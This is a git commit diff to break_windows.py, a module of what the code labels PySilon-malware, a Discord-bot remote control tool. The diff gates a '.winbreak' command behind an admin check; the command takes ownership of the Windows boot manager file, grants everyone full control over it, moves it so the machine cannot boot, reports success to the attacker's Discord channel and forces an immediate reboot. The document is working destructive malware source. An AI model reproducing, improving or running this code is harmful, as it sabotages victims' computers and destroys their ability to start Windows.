5e6920aeaba6b7acf99e585bd0a2da8e3288ab69
Yaw <67904196+AWeirDKiD@users.noreply.github.com>
2023-09-30 17:39:53 +0300

    Update break_windows.py

--- resources/source_code/break_windows.py
+++ resources/source_code/break_windows.py
@@ -4,31 +4,37 @@ import shutil
 # end of imports
 
 # on message
-elif message.content == '.break':
+elif message.content == '.winbreak':
     await message.delete()
-    explorer_commands = [
-        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v Hidden /t REG_DWORD /d 1 /f',
-        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f',
-    ]
+    if IsAdmin():
+        explorer_commands = [
+            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v Hidden /t REG_DWORD /d 1 /f',
+            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f',
+        ]
 
-    file_commands = [
-        'takeown /f "C:\\bootmgr"',
-        'icacls "C:\\bootmgr" /grant Everyone:(F)'
-    ]
+        file_commands = [
+            'takeown /f "C:\\bootmgr"',
+            'icacls "C:\\bootmgr" /grant Everyone:(F)'
+        ]
 
-    for cmd in explorer_commands:
-        subprocess.run(cmd, check=True)
+        for cmd in explorer_commands:
+            subprocess.run(cmd, check=True)
 
-    os.system("taskkill /f /im explorer.exe")
-    os.system("start explorer.exe")
+        os.system("taskkill /f /im explorer.exe")
+        os.system("start explorer.exe")
 
-    for cmd in file_commands:
-        subprocess.run(cmd, check=True)
+        for cmd in file_commands:
+            subprocess.run(cmd, check=True)
 
-    shutil.move("C:\\bootmgr", "C:\\pysilonontop")
+        shutil.move("C:\\bootmgr", "C:\\pysilonontop")
 
-    embed = discord.Embed(title="🟢 Success",description=f'```Attempting to break Windows```', colour=discord.Colour.green())
-    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-    await message.channel.send(embed=embed)
+        embed = discord.Embed(title="🟢 Success",description=f'```Successfully broke the Windows boot manager```', colour=discord.Colour.green())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await message.channel.send(embed=embed)
 
-    os.system("shutdown /r /f /t 0")
+        os.system("shutdown /r /f /t 0")
+    else:
+        embed = discord.Embed(title="📛 Error",description=f'```Admin permissions are required to break Windows```', colour=discord.Colour.green())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await message.channel.send(embed=embed)
+        
